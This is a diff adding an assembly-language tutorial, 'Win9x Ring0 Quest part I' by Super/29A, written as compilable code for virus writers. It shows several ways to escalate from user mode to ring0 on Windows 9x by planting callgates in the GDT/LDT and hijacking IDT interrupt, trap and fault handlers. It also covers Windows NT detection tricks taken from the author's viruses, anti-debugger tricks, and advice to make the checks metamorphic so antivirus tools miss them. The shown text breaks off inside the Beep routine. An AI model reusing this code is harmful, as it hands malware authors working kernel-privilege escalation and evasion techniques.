@@ -1,0 +1,939 @@
+                                                                              
+;    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿                                                    
+;    ³ Win9x Ring0 Quest ³                    ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ         
+;    ³                   ³                    ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ         
+;    ³      part I       ³                     ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ         
+;    ³                   ³                    ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ         
+;    ³   by  Super/29A   ³                    ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ         
+;    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ                                                    
+;                                                                             
+;                                                                             
+;                                                                             
+;This is my first article about ring0, although I have been obsessed with     
+;this stuff for ages. In this article I'll discuss all known and unknown      
+;techniques we can use to obtain ring0 access in Win9x platform. I think      
+;ring0 quest for WinNT platform deserves its own article; I'm currently       
+;researching new ways to get ring0 for WinNT (including Win2000) using        
+;some exploits. But I'm afraid you will have to wait for a future 29A         
+;issue. Meanwhile, I hope you enjoy this article.                             
+;                                                                             
+;I have collected some techniques from existing viruses (some of them are     
+;mine) and I have written some more that I believe haven't been used on       
+;any virus yet. If you happen to discover any other way to get ring0,         
+;please let me know... It'll be exciting for me to gain more ring0 power!     
+;                                                                             
+;As you have noticed, this article can be compiled with TASM32, heheheh       
+;I have decided to do it this way, so you can compile all code and follow     
+;step by step, as you read the explanations in the comments. I've tried to    
+;code without optimizations, so you don't suffer trying to understand what    
+;the code does. If by chance you find some strange code, skip it and get      
+;to next one  ;-D                                                             
+;                                                                             
+;Oh! btw, if you hear some ambulance in your PC speaker... don't panic  ;-)   
+;If you hear nothing, please, go to a doctor!!! X-DDD                         
+;                                                                             
+;Compile as follows:                                                          
+;   TASM32 -ml -m29A ring0.asm                                                
+;   TLINK32 -Tpe -aa -c -x ring0.obj,ring0.exe,,import32.lib                  
+;                                                                             
+;                                                                             
+;skip the beginning... it's boring   ;-)                                      
+;(go directly to code section)                                                
+;                                                                             
+;                                                                             
+;Due to lack of time, I had to break this tutorial in two pieces. Part two    
+;will be available soon, along with WinNT stuff (i hope!)                     
+                                                                              
+;===================================================================          
+; LET's BEGIN ...                                                             
+;===================================================================          
+                                                                              
+ .386p                                                                        
+ locals                                                                       
+ jumps                                                                        
+ .model flat   ;if u can read this, u dont need glasses  hahahah              
+                                                                              
+;some APIs that we need...                                                    
+                                                                              
+   extrn MessageBoxA : near                                                   
+   extrn GetVersion : near                                                    
+   extrn GetVersionExA : near                                                 
+   extrn GetModuleHandleA : near                                              
+   extrn ExitProcess : near                                                   
+                                                                              
+;some defines that may be interesting...                                      
+                                                                              
+   Pushad     equ 20h                                                         
+                                                                              
+;===================================================================          
+; DATA SECTION                                                                
+;===================================================================          
+                                                                              
+.data                                                                         
+                                                                              
+Msg0 db 'Ring0 Quest',0                                                       
+Msg1 db 'Starting...',0                                                       
+Msg2 db 'Bye Bye!!!',0                                                        
+Msg3 db 'WinNT still not supported',0                                         
+                                                                              
+Freq db 08h                                                                   
+                                                                              
+aNTDLL db 'NTDLL.DLL',0                                                       
+aKERNEL32 db 'KERNEL32.DLL',0                                                 
+                                                                              
+VersionInfo db 94h dup(0)                                                     
+                                                                              
+GDTR db 6 dup(?)                                                              
+IDTR db 6 dup(?)                                                              
+                                                                              
+LDTR dw ?                                                                     
+_LDTR db 6 dup(?)                                                             
+                                                                              
+FreeGDT1 dw ?                                                                 
+FreeLDT1 dw ?                                                                 
+                                                                              
+CallGate db 6 dup(?)                                                          
+                                                                              
+VxdCall dd ?                                                                  
+                                                                              
+                                                                              
+;===================================================================          
+; CODE SECTION                                                                
+;===================================================================          
+                                                                              
+.code                                                                         
+                                                                              
+                                                                              
+;===>                             <===                                        
+;===> U should start reading HERE <===                                        
+;===>                             <===                                        
+                                                                              
+Start proc near                                                               
+                                                                              
+;   int 3  ;-)                                                                
+                                                                              
+   pushad  ; preserve registers                                               
+                                                                              
+                                                                              
+;some nice presentation (don't forget to press the button X-D)                
+                                                                              
+   push 0                                                                     
+   push offset Msg0                                                           
+   push offset Msg1                                                           
+   push 0                                                                     
+   call MessageBoxA                                                           
+                                                                              
+                                                                              
+;Before jumpping to ring0, we should detect the windows platform. It should   
+;be Win9x, not WinNT. Here I present you many methods of doing so. They all   
+;should work fine... choose one...                                            
+                                                                              
+                                                                              
+;Avoiding WinNT : method 1                                                    
+;~~~~~~~~~~~~~~~~~~~~~~~~~                                                    
+                                                                              
+;GetVersion API returns some interesting information in a DWORD.              
+;If the most significant bit is set to one, the platform is Win9x,            
+;else it indicates winNT.                                                     
+                                                                              
+   call GetVersion                                                            
+   or eax,eax                                                                 
+   jns @@WinNT                                                                
+                                                                              
+                                                                              
+;Avoiding WinNT : method 2                                                    
+;~~~~~~~~~~~~~~~~~~~~~~~~~                                                    
+                                                                              
+;GetVersionExA API returns a lot more info in the OSVERSIONINFO structure     
+;which is 94h bytes long. The first dword should contain the size of this     
+;structure. the fifth dword (offset 10h) is the dwPlatformId value, which     
+;identifies the platform.                                                     
+;Value 0 means Win32s on windows3.x                                           
+;value 1 means Win9x                                                          
+;value 2 means WinNT                                                          
+                                                                              
+   mov esi,offset VersionInfo                                                 
+   mov dword ptr [esi],94h                                                    
+   push esi                                                                   
+   call GetVersionExA                                                         
+   xchg ecx,eax                                                               
+   jecxz @@WinNT                                                              
+   cmp dword ptr [esi+10h],1                                                  
+   jnz @@WinNT                                                                
+                                                                              
+                                                                              
+;Avoiding WinNT : method 3                                                    
+;~~~~~~~~~~~~~~~~~~~~~~~~~                                                    
+                                                                              
+;This is a very simple and short method of detecting Win9x. The Kernel32      
+;is responsible for giving the control to the host (or virus entrypoint),     
+;by means of a "JMP EAX" instruction (that's why EAX contains the address     
+;of the EntryPoint in Win9x platforms). When Host gets control there is       
+;a dword pushed in the stack, which is the address of a KERNEL32 routine      
+;that gets control if we exit with a simple RET instruction. That code        
+;is inside KERNEL32, which has an image base of 0BFF70000h in Win9x           
+;platform. So, we can simply check high byte 0BFh to ensure that we           
+;are on Win9x.                                                                
+                                                                              
+   cmp byte ptr [esp+Pushad+03h],0BFh                                         
+   jnz @@WinNT                                                                
+                                                                              
+;if you prefer a more optimized version, you can use the following code       
+;(only if you haven't pushed any value since you got control), extracted      
+;from my Repus.168 virus:                                                     
+;                                                                             
+;(dont execute this here, because stack has been modified)                    
+;                                                                             
+;   pop eax                                                                   
+;   push eax                                                                  
+;   inc eax   ; EAX<80000000h on WinNT platform                               
+;   jns @@WinNT                                                               
+                                                                              
+                                                                              
+;Avoiding WinNT : method 4                                                    
+;~~~~~~~~~~~~~~~~~~~~~~~~~                                                    
+                                                                              
+;We can do something similar to previous method, but using GetModuleHandle    
+;API to get the image base of KERNEL32, and decide if its WinNT according     
+;to its value:                                                                
+                                                                              
+   push offset aKERNEL32                                                      
+   call GetModuleHandleA                                                      
+   or eax,eax                                                                 
+   jns @@WinNT                                                                
+                                                                              
+                                                                              
+;Avoiding WinNT : method 5                                                    
+;~~~~~~~~~~~~~~~~~~~~~~~~~                                                    
+                                                                              
+;We can also use GetModuleHandle API to check for modules that only WinNT     
+;has loaded in memory, such as: HAL.DLL, NTDLL.DLL, etc...                    
+;Other possibility would be to use GetProcAddress API to get the address      
+;of a WinNT specific routine. If it doesnt exist, then we are not in WinNT    
+                                                                              
+   push offset aNTDLL                                                         
+   call GetModuleHandleA                                                      
+   or eax,eax                                                                 
+   jnz @@WinNT                                                                
+                                                                              
+                                                                              
+;Avoiding WinNT : method 6                                                    
+;~~~~~~~~~~~~~~~~~~~~~~~~~                                                    
+                                                                              
+;Another simple method consists on checking the value of the CS selector      
+;(other selector could also be checked).                                      
+;                                                                             
+;Under WinNT platform:                                                        
+;  ring0 CS = 0008h                                                           
+;  ring0 DS = 0010h                                                           
+;  ring3 CS = 001Bh                                                           
+;  ring3 DS = 0023h                                                           
+;                                                                             
+;However, Win9x platforms have a higher value, above 100h, so we can exploit  
+;this difference. The following code is extracted from my Repus.256 virus:    
+                                                                              
+   mov ecx,cs                                                                 
+   xor cl,cl                                                                  
+   jecxz @@WinNT                                                              
+                                                                              
+                                                                              
+;Avoiding WinNT : method 7                                                    
+;~~~~~~~~~~~~~~~~~~~~~~~~~                                                    
+                                                                              
+;Other simple way of detecting WinNT is to check if a LDT exists. If it       
+;doesn't exist, then it must be WinNT. If it has a non zero value, then       
+;it is Win9x (win32 applications have LDT)                                    
+                                                                              
+   sldt cx                                                                    
+   jcxz @@WinNT                                                               
+                                                                              
+                                                                              
+                                                                              
+;I think it's enough for detecting WinNT. There are a lot more ways of        
+;detecting WinNT platform. If you discover some short and interesting         
+;way, please send it to me. It would be convenient to use SEH to avoid        
+;unexpected errors while checking the platform. SEH can also be used          
+;to detect platform if you touch things that WinNT wouldn't permit it.        
+;I also suggest you make this checks metamorphic, so AVers cannot rely        
+;on this to discover suspected behaviour.                                     
+                                                                              
+                                                                              
+;I know you can't wait more... so, lets start the Ring0 Quest...              
+                                                                              
+;I will first present standard methods of jumpping to ring0, through          
+;CallGates, IntGates and ExceptionGates. You can get a lot of information     
+;on these methods from Intel manuals (take a look if you don't understand     
+;the meaning of some bits)                                                    
+                                                                              
+;lets get some information about protected mode...                            
+                                                                              
+   sgdt fword ptr [GDTR]                                                      
+   sidt fword ptr [IDTR]                                                      
+   sldt word ptr [LDTR]                                                       
+                                                                              
+;lets get the LDT base, for later usage                                       
+                                                                              
+   movzx esi,word ptr [LDTR]                                                  
+   add esi,dword ptr [GDTR+2]                                                 
+                                                                              
+   mov ax,[esi]                                                               
+   mov word ptr [_LDTR+0],ax  ; save limit of LDT                             
+   mov ax,[esi+2]                                                             
+   mov word ptr [_LDTR+2],ax  ; save LDT base                                 
+   mov al,[esi+4]                                                             
+   mov byte ptr [_LDTR+4],al                                                  
+   mov al,[esi+7]                                                             
+   mov byte ptr [_LDTR+5],al                                                  
+                                                                              
+                                                                              
+                                                                              
+;Getting Ring0 : CallGates                                                    
+;~~~~~~~~~~~~~~~~~~~~~~~~~                                                    
+                                                                              
+;The CallGate mechanism is very simple. We only need a free GDT or LDT        
+;entry, to fill it with the address of our ring0 code, the ring0 selector     
+;(we have used 28h which is Win9x ring0 code selector, but you can create     
+;your own ring0 code selector instead) and the right bits to make it work     
+;as a 32-bit callgate. To get into ring0 we just need to make a call far      
+;to the choosen ring0 code selector, and any offset (it doesn't matter        
+;which one we use); in our example we have shoosen a null offset. When        
+;our ring0 code gets control, CS:EIP has been pushed into the stack,          
+;so in order to get back to ring3, we must use the RETF instruction.          
+                                                                              
+;Here we have an example using GDT...                                         
+                                                                              
+   call Search_GDT                                                            
+                                                                              
+   mov esi,dword ptr [GDTR+2]                                                 
+                                                                              
+   push offset Ring0Code_retf                                                 
+   pop word ptr [esi+eax+0]                                                   
+   mov word ptr [esi+eax+2],0028h                                             
+   mov word ptr [esi+eax+4],0EC00h                                            
+   pop word ptr [esi+eax+6]                                                   
+                                                                              
+   mov [FreeGDT1],ax                                                          
+                                                                              
+   and dword ptr [CallGate],0                                                 
+   mov word ptr [CallGate+4],ax                                               
+                                                                              
+   call fword ptr [CallGate]   ; ring0!                                       
+                                                                              
+;Here we have an example using LDT...                                         
+                                                                              
+   call Search_LDT                                                            
+                                                                              
+   mov esi,dword ptr [_LDTR+2]                                                
+                                                                              
+   push offset Ring0Code_retf                                                 
+   pop word ptr [esi+eax+0]                                                   
+   mov word ptr [esi+eax+2],0028h                                             
+   mov word ptr [esi+eax+4],0EC00h                                            
+   pop word ptr [esi+eax+6]                                                   
+                                                                              
+   or al,4                                                                    
+   mov [FreeLDT1],ax                                                          
+                                                                              
+   and dword ptr [CallGate],0                                                 
+   mov word ptr [CallGate+4],ax                                               
+                                                                              
+   call fword ptr [CallGate]   ; ring0!                                       
+                                                                              
+                                                                              
+                                                                              
+;Getting Ring0 : IntGates                                                     
+;~~~~~~~~~~~~~~~~~~~~~~~~                                                     
+                                                                              
+;This method consists on getting ring0 priviledge by means of a software      
+;interrupt. We need to modify an IDT entry so that its handler points to      
+;our ring0 code. The selected IDT entry should have DPL=3 so that we can      
+;execute the interrupt from ring3. We may choose interrupts what have         
+;already DSL=3, such as 01h,03h,04h,05h,30h. If we choose those               
+;interrupts, we just need to save the handler offset and sustitute with       
+;our own ring0 handler. When our ring0 interrupt code gets control, the       
+;processor has already pushed (in the ring0 stack) the flags, the ring3       
+;code selector and the ring3 return offset. So, in order to return back       
+;to ring3, we have to use an IRET instruction.                                
+                                                                              
+                                                                              
+;Lets see an example, using interrupt 05h:                                    
+                                                                              
+   mov esi,dword ptr [IDTR+2]                                                 
+                                                                              
+   push dword ptr [esi+(8*5)+0]   ; save IDT entry                            
+   push dword ptr [esi+(8*5)+4]                                               
+                                                                              
+   push offset Ring0Code_iret                                                 
+   pop word ptr [esi+(8*5)+0]                                                 
+   pop word ptr [esi+(8*5)+6]                                                 
+                                                                              
+   int 05h   ; ring0!                                                         
+                                                                              
+   pop dword ptr [esi+(8*5)+4]   ; restore IDT entry                          
+   pop dword ptr [esi+(8*5)+0]                                                
+                                                                              
+                                                                              
+;We can do the same with interrupt 03h, using the int3 one-byte opcode        
+;or the two-byte interrupt instruction:                                       
+                                                                              
+   push dword ptr [esi+(8*3)+0]   ; save IDT entry                            
+   push dword ptr [esi+(8*3)+4]                                               
+                                                                              
+   push offset Ring0Code_iret                                                 
+   pop word ptr [esi+(8*3)+0]                                                 
+   pop word ptr [esi+(8*3)+6]                                                 
+                                                                              
+   ;lets try with 2-byte version...                                           
+                                                                              
+   db 0CDh,03h   ; ring0!                                                     
+                                                                              
+   ;now lets try with 1-byte (for optimization fans)                          
+                                                                              
+   db 0CCh   ; ring0!   (mmmh... "sounds" great!  X-DDD)                      
+                                                                              
+   pop dword ptr [esi+(8*3)+4]   ; restore IDT entry                          
+   pop dword ptr [esi+(8*3)+0]                                                
+                                                                              
+                                                                              
+;If you want more anti-debugging ways, try to use interrupt 01h. You can      
+;use the interrupt instruction (2 bytes) or you can use the undocumented      
+;opcode 0F1h which has the same effect (it may not work on some weird         
+;processors?)                                                                 
+                                                                              
+   push dword ptr [esi+(8*1)+0]   ; save IDT entry                            
+   push dword ptr [esi+(8*1)+4]                                               
+                                                                              
+   push offset Ring0Code_iret                                                 
+   pop word ptr [esi+(8*1)+0]                                                 
+   pop word ptr [esi+(8*1)+6]                                                 
+                                                                              
+   ;has your softice survived?  X-D                                           
+                                                                              
+   ;lets try with 2-byte version...                                           
+                                                                              
+   db 0CDh,01h   ; ring0!                                                     
+                                                                              
+   ;now lets try with 1-byte (for optimization fans)                          
+                                                                              
+   db 0F1h   ; ring0!                                                         
+                                                                              
+   pop dword ptr [esi+(8*1)+4]   ; restore IDT entry                          
+   pop dword ptr [esi+(8*1)+0]                                                
+                                                                              
+;Now, we are gonna use another interrupt, no matter which one (but inside     
+;the IDT limits!), so we'll not only need to write the address of our ring0   
+;handler, but also the characteristics of the IDT descriptor, as well as      
+;the ring0 code selector. Lets try with interrupt 20h (used from ring0 to     
+;call VxD services, so if you use them, don't forget to restore IDT entry!)   
+                                                                              
+   push dword ptr [esi+(8*20h)+0]   ; save IDT entry                          
+   push dword ptr [esi+(8*20h)+4]                                             
+                                                                              
+   push offset Ring0Code_iret                                                 
+   pop word ptr [esi+(8*20h)+0]                                               
+   mov word ptr [esi+(8*20h)+2],0028h                                         
+   mov word ptr [esi+(8*20h)+4],0EE00h                                        
+   pop word ptr [esi+(8*20h)+6]                                               
+                                                                              
+   int 20h   ; ring0!                                                         
+                                                                              
+   pop dword ptr [esi+(8*20h)+4]   ; restore IDT entry                        
+   pop dword ptr [esi+(8*20h)+0]                                              
+                                                                              
+                                                                              
+;In case you choose an exception handler as your interrupt, be careful        
+;not to generate an exception inside your code, or else it may be             
+;recursive! For example, don't access a non-present page if you choose        
+;interrupt 0Eh (generated when a page fault occurs)                           
+                                                                              
+                                                                              
+;Lets have more fun with interrupts... Now we'll use last IDT entry:          
+                                                                              
+   movzx ebx,word ptr [IDTR]                                                  
+   sub ebx,7                                                                  
+                                                                              
+   push dword ptr [esi+ebx+0]   ; save IDT entry                              
+   push dword ptr [esi+ebx+4]                                                 
+                                                                              
+   push offset Ring0Code_iret                                                 
+   pop word ptr [esi+ebx+0]                                                   
+   mov word ptr [esi+ebx+2],0028h                                             
+   mov word ptr [esi+ebx+4],0EE00h                                            
+   pop word ptr [esi+ebx+6]                                                   
+                                                                              
+   mov eax,ebx                                                                
+   shl eax,5                                                                  
+   add eax,90C300CDh                                                          
+                                                                              
+   push eax                                                                   
+   call esp  ; execute in stack: "int N"  --> ring0!                          
+   pop eax                                                                    
+                                                                              
+   pop dword ptr [esi+ebx+4]   ; restore IDT entry                            
+   pop dword ptr [esi+ebx+0]                                                  
+                                                                              
+                                                                              
+                                                                              
+;Getting Ring0 : TrapGates                                                    
+;~~~~~~~~~~~~~~~~~~~~~~~~~                                                    
+                                                                              
+;This is the same as IntGates, but the interrupt is generated by hardware,    
+;not by using INT instruction. Only interrupts 01h,03h and 04h can generate   
+;Trap exceptions. Interrupt 01h can also work as a Fault interrupt in rare    
+;situations, but we'll only describe it here as a Trap exception.             
+                                                                              
+                                                                              
+;We already played with interrupts 01h and 03h in previous examples issuing   
+;a software interrupt, but now the processor is gonna do it for us. We'll     
+;generate a 01h trap exception activating TF flag, to force a single-step     
+;execution. As a result, the interrupt 01h will take control. Don't forget    
+;to disable TF inside int1, so that it don't get execute again and again      
+;(imagine what could happen if single-step is activated while restoring       
+;int1 original handler!)                                                      
+                                                                              
+   push dword ptr [esi+(8*1)+0]   ; save IDT entry                            
+   push dword ptr [esi+(8*1)+4]                                               
+                                                                              
+   push offset Ring0Code_int1                                                 
+   pop word ptr [esi+(8*1)+0]                                                 
+   pop word ptr [esi+(8*1)+6]                                                 
+                                                                              
+   pushfd                                                                     
+   pop eax                                                                    
+   or ah,1                                                                    
+   push eax                                                                   
+   popfd ; TF=1                                                               
+                                                                              
+   nop   ; ring0!                                                             
+                                                                              
+   pop dword ptr [esi+(8*1)+4]   ; restore IDT entry                          
+   pop dword ptr [esi+(8*1)+0]                                                
+                                                                              
+                                                                              
+;Now, lets try interrupt 04h (Overflow Exception):                            
+                                                                              
+   push dword ptr [esi+(8*4)+0]   ; save IDT entry                            
+   push dword ptr [esi+(8*4)+4]                                               
+                                                                              
+   push offset Ring0Code_iret                                                 
+   pop word ptr [esi+(8*4)+0]                                                 
+   pop word ptr [esi+(8*4)+6]                                                 
+                                                                              
+   pushfd                                                                     
+   pop eax                                                                    
+   or ah,80h                                                                  
+   push eax                                                                   
+   popfd ; OF=1                                                               
+                                                                              
+   into   ; ring0!                                                            
+                                                                              
+   pop dword ptr [esi+(8*4)+4]   ; restore IDT entry                          
+   pop dword ptr [esi+(8*4)+0]                                                
+                                                                              
+                                                                              
+                                                                              
+;Getting Ring0 : FaultGates                                                   
+;~~~~~~~~~~~~~~~~~~~~~~~~~~                                                   
+                                                                              
+;This is the same as IntGates, but the interrupt is generated by hardware,    
+;not by using INT instruction. In this case we don't have to worry about      
+;DPL=3, we will leave it as it is (DPL=0). We only have to modify the         
+;address of the ring0 handler. The selector is already set to ring0 code      
+;selector (28h), and the bits are already set to indicate an exception        
+;interrupt. We also have to take care about the Error code that is pushed     
+;into the stack in some cases. Also pay attention to the CS:EIP pushed        
+;into stack when our ring0 code gets control, because it is pointing to       
+;the instruction which generated the exception; to avoid end-less loop,       
+;you have to modify the return address in the stack to point to the next      
+;instruction (or any other place you would like toget back to ring3).         
+                                                                              
+                                                                              
+;lets generate a Divide Error Exception (interrupt 0):                        
+                                                                              
+   push dword ptr [esi+(8*0)+0]   ; save IDT entry                            
+   push dword ptr [esi+(8*0)+4]                                               
+                                                                              
+   push offset Ring0Code_div                                                  
+   pop word ptr [esi+(8*0)+0]                                                 
+   pop word ptr [esi+(8*0)+6]                                                 
+                                                                              
+   ;we can use DIV or IDIV instructions                                       
+                                                                              
+   xor eax,eax                                                                
+   div eax   ; ring0!                                                         
+                                                                              
+   ;we can use AAM instruction to implicitly divide by zero                   
+                                                                              
+   aam 00h   ; ring0!                                                         
+                                                                              
+   ;we can divide so that result doesn't fit in destination operand           
+                                                                              
+   mov edx,1                                                                  
+   mov eax,0                                                                  
+   div edx   ; ring0!                                                         
+                                                                              
+   pop dword ptr [esi+(8*0)+4]   ; restore IDT entry                          
+   pop dword ptr [esi+(8*0)+0]                                                
+                                                                              
+                                                                              
+;lets generate a Bound Exception (interrupt 5):                               
+                                                                              
+;(It's not the same as we did before, executing an INT instruction)           
+                                                                              
+   push dword ptr [esi+(8*5)+0]   ; save IDT entry                            
+   push dword ptr [esi+(8*5)+4]                                               
+                                                                              
+   push offset Ring0Code_bound                                                
+   pop word ptr [esi+(8*5)+0]                                                 
+   pop word ptr [esi+(8*5)+6]                                                 
+                                                                              
+   push 2                                                                     
+   push 1                                                                     
+   xor eax,eax ; 0 is not between 1 and 2   :-)                               
+                                                                              
+   bound eax,[esp]   ; ring0!                                                 
+                                                                              
+   pop eax                                                                    
+   pop eax                                                                    
+                                                                              
+   pop dword ptr [esi+(8*5)+4]   ; restore IDT entry                          
+   pop dword ptr [esi+(8*5)+0]                                                
+                                                                              
+                                                                              
+;lets generate an Invalid Opcode Exception (interrupt 6):                     
+                                                                              
+   push dword ptr [esi+(8*6)+0]   ; save IDT entry                            
+   push dword ptr [esi+(8*6)+4]                                               
+                                                                              
+   push offset Ring0Code_arpl                                                 
+   pop word ptr [esi+(8*6)+0]                                                 
+   pop word ptr [esi+(8*6)+6]                                                 
+                                                                              
+   ;TASM doesn't want to compile ARPL instruction                             
+                                                                              
+   db 63h,0C0h   ; ARPL AX,AX ---> ring0!                                     
+                                                                              
+   ;Pay attention to the previous instruction. We have choosen registers.     
+   ;If we had choosen memory access, we could have generated a fault          
+   ;exception, and our interrupt 6 handler wouln't have activated!!!          
+                                                                              
+   ;lets try another invalid opcode                                           
+                                                                              
+   db 0FFh,0FFh                                                               
+                                                                              
+   pop dword ptr [esi+(8*6)+4]   ; restore IDT entry                          
+   pop dword ptr [esi+(8*6)+0]                                                
+                                                                              
+                                                                              
+;As you can see, there are plenty of ways to generate an exception,           
+;and take control in ring0 priviledge. You can even patch the original        
+;handler with a jump without modifying IDT entry. Discover your own way.      
+;Be original! don't copy from this tutorial!  :-)                             
+                                                                              
+                                                                              
+                                                                              
+;I think, I'll stop here... I have no time... I will just present you         
+;some of the titles for part two... perhaps it gives you some ideas...        
+                                                                              
+                                                                              
+                                                                              
+;Getting Ring0 : IRQs                                                         
+;~~~~~~~~~~~~~~~~~~~~                                                         
+;will be available in Win9x "Ring0 Quest Part II"                             
+;(see example in Repus.128)                                                   
+                                                                              
+                                                                              
+;Getting Ring0 : Ports                                                        
+;~~~~~~~~~~~~~~~~~~~~~                                                        
+;will be available in Win9x "Ring0 Quest Part II"                             
+                                                                              
+                                                                              
+;Getting Ring0 : VMM                                                          
+;~~~~~~~~~~~~~~~~~~~                                                          
+;will be available in Win9x "Ring0 Quest Part II"                             
+;(see FuckHarry, among others)                                                
+                                                                              
+                                                                              
+;Getting Ring0 : CallBacks                                                    
+;~~~~~~~~~~~~~~~~~~~~~~~~~                                                    
+;will be available in Win9x "Ring0 Quest Part II"                             
+                                                                              
+                                                                              
+;Getting Ring0 : Thunks                                                       
+;~~~~~~~~~~~~~~~~~~~~~~                                                       
+;will be available in Win9x "Ring0 Quest Part II"                             
+                                                                              
+                                                                              
+;Getting Ring0 : DeviceIOControl                                              
+;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                              
+;will be available in Win9x "Ring0 Quest Part II"                             
+                                                                              
+                                                                              
+                                                                              
+@@Finish:                                                                     
+                                                                              
+;I hope you have enjoyed this article!                                        
+                                                                              
+   push 0                                                                     
+   push offset Msg0                                                           
+   push offset Msg2                                                           
+   push 0                                                                     
+   call MessageBoxA                                                           
+                                                                              
+   jmp @@Exit                                                                 
+                                                                              
+                                                                              
+@@WinNT:                                                                      
+                                                                              
+;WinNT platform will be conquered soon!!!                                     
+                                                                              
+   push 0                                                                     
+   push offset Msg0                                                           
+   push offset Msg3                                                           
+   push 0                                                                     
+   call MessageBoxA                                                           
+                                                                              
+@@Exit:                                                                       
+                                                                              
+   popad  ; recover registers                                                 
+                                                                              
+   push 0                                                                     
+   call ExitProcess                                                           
+                                                                              
+Start endp                                                                    
+                                                                              
+;-------------------------------------------------------------------          
+                                                                              
+Get_VxdCall proc near                                                         
+                                                                              
+   pushad                                                                     
+                                                                              
+   push offset aKERNEL32                                                      
+   call GetModuleHandleA  ; EAX = Kernel32 image base                         
+                                                                              
+;mmmh... too much optimized?   :-)                                            
+                                                                              
+   mov ebx,[eax+3Ch]      ; EBX = RVA of PEheader                             
+   mov ebx,[eax+ebx+78h]  ; EBX = RVA of ExportTable                          
+   mov ebx,[eax+ebx+1Ch]  ; EBX = RVA of AddressTable                         
+   add eax,[eax+ebx]      ; EAX = Address of VxdCall API                      
+                                                                              
+   mov [esp+1Ch],eax  ; return EAX                                            
+                                                                              
+   popad                                                                      
+                                                                              
+   ret                                                                        
+                                                                              
+Get_VxdCall endp                                                              
+                                                                              
+;-------------------------------------------------------------------          
+                                                                              
+Search_GDT proc near                                                          
+                                                                              
+   pushad                                                                     
+                                                                              
+   mov esi,dword ptr [GDTR+2]                                                 
+                                                                              
+   mov eax,8  ; skipping null selector                                        
+                                                                              
+@@1:                                                                          
+                                                                              
+   cmp dword ptr [esi+eax+0],0                                                
+   jnz @@2                                                                    
+   cmp dword ptr [esi+eax+4],0                                                
+   jz @@3                                                                     
+                                                                              
+@@2:                                                                          
+                                                                              
+   add eax,8                                                                  
+                                                                              
+   cmp ax,word ptr [GDTR]                                                     
+   jb @@1                                                                     
+                                                                              
+;if we haven't found any free GDT entry, lets use the last two entries        
+                                                                              
+   movzx eax,word ptr [GDTR]                                                  
+                                                                              
+   sub eax,7                                                                  
+                                                                              
+@@3:                                                                          
+                                                                              
+   mov [esp+1Ch],eax  ; return EAX                                            
+                                                                              
+   popad                                                                      
+                                                                              
+   ret                                                                        
+                                                                              
+Search_GDT endp                                                               
+                                                                              
+;-------------------------------------------------------------------          
+                                                                              
+Search_LDT proc near                                                          
+                                                                              
+   pushad                                                                     
+                                                                              
+   mov esi,dword ptr [_LDTR+2]                                                
+                                                                              
+   mov eax,8  ; skipping null selector                                        
+                                                                              
+@@1:                                                                          
+                                                                              
+   cmp dword ptr [esi+eax+0],0                                                
+   jnz @@2                                                                    
+   cmp dword ptr [esi+eax+4],0                                                
+   jz @@3                                                                     
+                                                                              
+@@2:                                                                          
+                                                                              
+   add eax,8                                                                  
+                                                                              
+   cmp ax,word ptr [_LDTR]                                                    
+   jb @@1                                                                     
+                                                                              
+;if we haven't found any free GDT entry, lets use the last two entries        
+                                                                              
+   mov ax,word ptr [_LDTR]                                                    
+                                                                              
+   sub eax,7                                                                  
+                                                                              
+@@3:                                                                          
+                                                                              
+   mov [esp+1Ch],eax  ; return EAX                                            
+                                                                              
+   popad                                                                      
+                                                                              
+   ret                                                                        
+                                                                              
+Search_LDT endp                                                               
+                                                                              
+;-------------------------------------------------------------------          
+                                                                              
+Ring0Code_ret proc near                                                       
+                                                                              
+   pushad                                                                     
+   call Beep                                                                  
+   popad                                                                      
+                                                                              
+   ret                                                                        
+                                                                              
+Ring0Code_ret endp                                                            
+                                                                              
+;-------------------------------------------------------------------          
+                                                                              
+Ring0Code_retf proc far                                                       
+                                                                              
+   pushad                                                                     
+   call Beep                                                                  
+   popad                                                                      
+                                                                              
+   retf                                                                       
+                                                                              
+Ring0Code_retf endp                                                           
+                                                                              
+;-------------------------------------------------------------------          
+                                                                              
+Ring0Code_iret proc far                                                       
+                                                                              
+   pushad                                                                     
+   call Beep                                                                  
+   popad                                                                      
+                                                                              
+   iretd                                                                      
+                                                                              
+Ring0Code_iret endp                                                           
+                                                                              
+;-------------------------------------------------------------------          
+                                                                              
+Ring0Code_int1 proc far                                                       
+                                                                              
+   pushad                                                                     
+   call Beep                                                                  
+   popad                                                                      
+                                                                              
+   and byte ptr [esp+9],0FEh   ; TF=0                                         
+                                                                              
+   iretd                                                                      
+                                                                              
+Ring0Code_int1 endp                                                           
+                                                                              
+;-------------------------------------------------------------------          
+                                                                              
+Ring0Code_div proc far                                                        
+                                                                              
+   pushad                                                                     
+   call Beep                                                                  
+   popad                                                                      
+                                                                              
+   add dword ptr [esp],2   ; skip DIV instruction!!!                          
+                                                                              
+   iretd                                                                      
+                                                                              
+Ring0Code_div endp                                                            
+                                                                              
+;-------------------------------------------------------------------          
+                                                                              
+Ring0Code_bound proc far                                                      
+                                                                              
+   pushad                                                                     
+   call Beep                                                                  
+   popad                                                                      
+                                                                              
+   add dword ptr [esp],3   ; skip BOUND instruction!!!                        
+                                                                              
+   iretd                                                                      
+                                                                              
+Ring0Code_bound endp                                                          
+                                                                              
+;-------------------------------------------------------------------          
+                                                                              
+Ring0Code_arpl proc far                                                       
+                                                                              
+   pushad                                                                     
+   call Beep                                                                  
+   popad                                                                      
+                                                                              
+   add dword ptr [esp],2   ; skip ARPL instruction!!!                         
+                                                                              
+   iretd                                                                      
+                                                                              
+Ring0Code_arpl endp                                                           
+                                                                              
+;-------------------------------------------------------------------          
+                                                                              
+Beep proc near                                                                
+                                                                              
+   pushad                                                                     
+                                                                              
+   mov al,0B6h                                                                
+   out 43h,al                                                                 
+                                                                              
+   mov al,[Freq]                                                              
+                                                                              
+   out 42h,al                                                                 
